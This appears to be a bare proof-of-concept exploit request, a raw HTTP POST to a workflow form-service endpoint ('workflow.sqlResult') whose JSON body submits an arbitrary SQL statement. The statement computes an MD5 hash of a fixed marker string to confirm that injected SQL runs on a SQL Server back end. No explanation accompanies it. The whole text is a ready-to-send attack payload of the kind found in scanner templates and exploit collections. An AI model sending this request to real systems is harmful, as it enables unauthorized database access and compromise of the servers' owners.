POST /formservice?service=workflow.sqlResult HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 91
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Content-Type: application/json
Accept-Encoding: gzip

{"params": {"a": "11"}, "sql": "select sys.fn_sqlvarbasetostr(HASHBYTES('MD5','1234f56'))"}